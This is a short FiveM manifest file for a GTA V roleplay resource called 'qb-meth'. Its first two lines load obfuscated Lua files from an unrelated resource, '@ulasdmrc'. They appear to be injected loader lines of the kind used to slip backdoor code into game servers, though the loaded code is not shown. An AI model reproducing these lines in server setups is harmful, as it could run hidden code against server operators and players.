shared_script '@ulasdmrc/shared_fg-obfuscated.lua'
shared_script '@ulasdmrc/ai_module_fg-obfuscated.lua'

fx_version 'cerulean'
game { 'gta5' }
description 'qb-meth'
version '1.0.0'
client_script "client.lua"
server_script "server.lua"
shared_scripts { 
	'config.lua'
}
lua54 'yes'